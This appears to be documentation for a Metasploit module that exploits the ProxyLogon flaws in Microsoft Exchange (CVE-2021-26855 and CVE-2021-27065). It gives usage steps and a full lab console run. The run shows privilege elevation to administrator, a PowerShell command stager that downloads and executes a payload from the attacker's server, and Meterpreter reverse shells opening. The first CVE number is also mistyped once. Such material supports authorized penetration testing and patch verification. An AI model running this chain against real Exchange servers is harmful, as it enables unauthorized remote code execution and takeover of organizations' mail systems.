## Vulnerable Application

CVE-2021-28855 is a pre-authentication SSRF (Server Side Request Forgery) which allows an attacker to
bypass authentication by sending specially crafted HTTP requests. This vulnerability is part of an attack
chain used to perform an RCE (Remote Code Execution).

CVE-2021-27065 is a post-auth arbitrary-file-write vulnerability to get code execution and the second part
of ProxyLogon attack chain.

This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012, Exchange 2016 CU18 < 15.01.2106.013,
Exchange 2016 CU19 < 15.01.2176.009, Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).

### Introduction

This module exploit a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the
authentication, impersonating as the admin (CVE-2021-26855) and write arbitrary file (CVE-2021-27065) to
get the RCE (Remote Code Execution).

By taking advantage of this vulnerability, you can execute arbitrary commands on the remote Microsoft
Exchange Server.

All components are vulnerable by default.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/http/exchange_proxylogon_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set EMAIL [EMAIL ADDRESS]`
5. Do: `run`

## Options

### EMAIL

A known email address for this organization.

### METHOD

HTTP Method to use for the check (only). Default: POST

## Advanced Options

### MapiClientApp

This is MAPI client version sent in the request.

### MaxEntries

Max counter loop to wait for OAB Virtual Dir reset. Default: 30

## Scenarios

```
msf6 exploit(windows/http/exchange_proxylogon_rce) > options 

Module options (exploit/windows/http/exchange_proxylogon_rce):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   EMAIL    gaston.lagaffe@pwned.lab  yes       A known email address for this organization
   METHOD   POST                      yes       HTTP Method to use for the check (Accepted: GET, POST)
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   172.20.2.110              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    443                       yes       The target port (TCP)
   SRVHOST  0.0.0.0                   yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080                      yes       The local port to listen on.
   SSL      true                      no        Negotiate SSL/TLS for outgoing connections
   SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                            no        The URI to use for this exploit (default is random)
   VHOST                              no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.20.2.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Meterpreter


msf6 exploit(windows/http/exchange_proxylogon_rce) > run

[*] Started reverse TCP handler on 172.20.2.12:4444 
[*] Using auxiliary/scanner/http/exchange_proxylogon as check
[+] https://172.20.2.110:443 - The target is vulnerable to CVE-2021-26855.
[+] Obtained HTTP response code 500 for https://172.20.2.110/ecp/R.js.
[*] Scanned 1 of 1 hosts (100% complete)
[+] The target appears to be vulnerable
[*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-26855
[*]  * internal server name (EXCH2K16)
[*] https://172.20.2.110:443 - Sending autodiscover request
[*]  * Server: d8a7cc8c-7180-4b80-b53e-57c3449bcd4e@pwned.lab
[*]  * LegacyDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=9b9d8cf634f44ec4a0eda5c1c7c311da-Gasto
[*] https://172.20.2.110:443 - Sending mapi request
[*]  * sid: S-1-5-21-3756917241-677735496-3570881102-1141 (gaston.lagaffe@pwned.lab)
[*]  * sid: S-1-5-21-3756917241-677735496-3570881102-500  (elevated to administrator)
[*] https://172.20.2.110:443 - Sending ProxyLogon request
[*]  * ASP.NET_SessionId: b687af0e-62ff-44ac-9aa2-01baa8d829be
[*]  * msExchEcpCanary: NBsILiOonEiWIPqyLjq9a5FOVt676NgI-frGOkd4RaBETlKR0Tc5nJEg_E_blC9_ZgNlX8LHNB4.
[*]  * OAB id: 482b1c13-3b3f-451b-8635-613aee2d256a (OAB (Default Web Site))
[*] https://172.20.2.110:443 - Attempt to exploit for CVE-2021-27065
[*]  * prepare the payload on the remote target
[*]  * write the payload on the remote target
[!]  * wail a lot (0)
[!]  * wail a lot (1)
[+]  * yeeting windows/x64/meterpreter/reverse_tcp payload at 172.20.2.110:443
[*] Using URL: http://0.0.0.0:8080/l1Ij034H1
[*] Local IP: http://172.20.2.12:8080/l1Ij034H1
[*] Generated command stager: ["powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\WcoJdFYJ.exe http://172.20.2.12:8080/l1Ij034H1 & %TEMP%\\WcoJdFYJ.exe & del %TEMP%\\WcoJdFYJ.exe"]
[*] Client 172.20.2.110 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0) requested /l1Ij034H1
[*] Sending payload to 172.20.2.110 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0)
[*] Sending stage (200262 bytes) to 172.20.2.110
[*] Client 172.20.2.110 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0) requested /l1Ij034H1
[*] Sending payload to 172.20.2.110 (Mozilla/5.0 (Windows NT; Windows NT 6.3; fr-FR) WindowsPowerShell/4.0)
[*] Meterpreter session 19 opened (172.20.2.12:4444 -> 172.20.2.110:30682) at 2021-03-15 00:41:44 +0400
[*] Sending stage (200262 bytes) to 172.20.2.110
[*] Meterpreter session 20 opened (172.20.2.12:4444 -> 172.20.2.110:30685) at 2021-03-15 00:41:44 +0400
[*] Server stopped.

meterpreter > 
```

## References

1. <https://proxylogon.com/>
2. <http://aka.ms/exchangevulns>
3. <https://www.praetorian.com/blog/reproducing-proxylogon-exploit>
4. <https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265>
